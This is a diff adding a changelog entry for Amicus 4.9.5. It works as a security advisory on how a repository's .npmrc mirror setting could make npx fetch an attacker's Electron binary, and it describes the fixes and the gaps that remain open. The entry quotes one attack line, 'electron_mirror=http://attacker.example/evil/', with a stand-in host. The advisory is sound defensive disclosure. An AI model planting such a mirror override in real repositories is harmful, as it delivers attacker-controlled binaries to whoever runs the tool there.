@@ -3,6 +3,88 @@
 All notable changes to Amicus are documented here. Format follows
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versions follow semver.
 
+## [4.9.5] - 2026-09-07
+
+*A repository you cloned could choose which bytes became your Electron.*
+
+npm exports an `.npmrc` key it does not recognise to every child process it spawns, so a repository
+containing one line — `electron_mirror=http://attacker.example/evil/` — reaches `npx -y amicus@latest`
+as `npm_config_electron_mirror`. `@electron/get` reads that name **above** its own default
+(`artifact-utils.js`), and validates the download against a `SHASUMS256.txt` fetched from the *same*
+redirected host, so the checksum verified the attacker's file against the attacker's checksum. Amicus
+passed no digest of its own. Amicus's own skills, troubleshooting page and Claude Code registration
+all invoke it as `npx -y amicus@latest`, whose npm prefix is whatever directory you are sitting in.
+Amicus then launches the extracted binary for the GUI. Every link was measured, end to end.
+
+### Security
+
+- **The Electron artifact is now pinned to the digest Electron publishes, on both routes (#236).**
+  Four controls, each independently testable:
+  - **The download carries `checksums`**, read from `checksums.json` inside the Electron npm package —
+    the same anchor Electron's own installer uses. With a digest supplied, `@electron/get` writes a
+    **local** `SHASUMS256.txt` and never fetches one, so a redirected mirror can still serve bytes but
+    they must match what Electron published. This is the control that breaks the chain.
+  - **A cached artifact is hashed before it is extracted.** That route runs *first* — on every
+    `npm install -g amicus`, on first GUI use, and on `doctor --fix` — and previously accepted any
+    file with the right name from any subdirectory of a cache root, with no verification of any kind.
+    A mismatch is refused and the file removed; the removal is fenced through the repo's own realpath
+    fence and a basename check, so it is strictly narrower than the unconditional delete it replaces.
+  - **The Electron installer's environment is scrubbed.** The last-resort path spawns Electron's own
+    `install.js`, which honours the mirror *and* a remote-checksum override; without this, pinning the
+    in-process download would merely have funnelled an attacker into an unpinned downloader. Every
+    repo-plantable `npm_config_electron_*` / `npm_package_config_electron_*` name is removed —
+    case-insensitively, because a repo `package.json` `config` key reaches the child with its case
+    preserved — along with `npm_config_platform` and `npm_config_arch`, which choose *which* artifact
+    that installer fetches. `ELECTRON_INSTALL_PLATFORM` / `_ARCH` are pinned to amicus's own resolution.
+  - **An archive refused for path traversal is terminal.** `robustExtract` treated extract-zip's own
+    "invalid relative path" / "absolute path" refusals exactly like a stall: clean the directory and
+    re-run the same archive through an OS extractor amicus does not control. Such a refusal now throws
+    `UNZIP_UNSAFE_ARCHIVE`, is not retried at either call site, and the file is kept as evidence rather
+    than deleted. A **stall** still falls back — that fallback is the Node-24 workaround this module
+    exists for, and a test pins the distinction.
+
+  The digest anchor is read from the **running amicus's own** Electron package in preference to the
+  directory being repaired. That is load-bearing rather than tidy: `doctor --fix` hands the repair a
+  directory found by scanning npx caches, and reading the digest out of the same directory the bytes
+  came from would have let it vouch for itself — measured, before the fix, as `repaired: true` over
+  bytes reading `POISONED-BYTES`.
+
+  One documented escape hatch, `AMICUS_ALLOW_UNVERIFIED_ELECTRON=1`, exists for the one legitimate
+  case (you deliberately run a rebuilt Electron). It is a bare environment name, which a repository
+  cannot plant; it accepts a contradicting cached artifact and drops the pin on a download; it
+  re-enables nothing else. Bare `ELECTRON_MIRROR` stays honoured — that spelling is not
+  repo-injectable, so it carries the machine owner's intent, and the digest is enforced either way.
+
+- **What this does NOT close, stated plainly.** `registry=` in a hostile `.npmrc` dominates every
+  control above: under `npx`, amicus itself, the Electron tarball and its `checksums.json` would all
+  come from the attacker, and the pin would then faithfully vouch for attacker bytes. Electron's own
+  npm postinstall runs with the hostile environment live, before any amicus code executes. Nothing
+  verifies `dist/electron.exe` at launch — this closes acquisition, not custody. Extraction output is
+  still not fenced, and the extractor still reports success when any file lands. And where **no**
+  published digest covers an artifact — an Electron package with no `checksums.json`, or one whose own
+  metadata names a version amicus holds no entry for — there is nothing to contradict: those bytes are
+  extracted and marked `unverified` rather than refused, because refusing would strand every older
+  Electron in a re-download loop. Run `npx -y amicus@latest` from a directory you trust.
+
+### Fixed
+
+- **Three advisories that reached the published dependency tree.** `fast-uri` (two high, SSRF) via
+  `@modelcontextprotocol/sdk` → `ajv`, and `qs` (moderate) via the same SDK → `express`. Fixed by a
+  targeted update of exactly those two packages and their own closure — five lockfile entries — rather
+  than `npm audit fix`, which wanted to move 31 packages, almost all of them puppeteer's dev tree
+  including a major. `extract-zip`, the remaining production-tree advisory, has no fixed version at
+  any release and is addressed by the trust work above instead of by a bump.
+- **Two records that asserted things that were not true.** The released 4.9.4 notes said "Twenty-four
+  probe rows" and "the full 61-case matrix", both stale at the tag — M23 joined the M group during
+  council #235 round 3 without the matrix being re-run, so the group is twenty-five rows and the filed
+  matrix is 62 cases, which the BACKLOG already said while the CHANGELOG contradicted it. And the
+  backlog's own audit filing recorded `extract-zip` as dev-only "via puppeteer"; it is a direct
+  production dependency, and calling it dev-only is exactly the reasoning that would have let it sit.
+- **`docs/ROADMAP.md`'s status lines are now pinned in the release commit.** They ship in the npm
+  tarball and they are a factual claim about the current version, but they were updated in the
+  post-ship pass, which runs *after* the tag — so every published package has named the previous
+  release. `v4.9.4`'s roadmap says "v4.9.3"; `v4.9.3`'s says "v4.9.0". Verified across three tags.
+
 ## [4.9.4] - 2026-09-07
 
 *The effort level was never on the wire, and the budget stopped at the routes the catalog could clamp.*
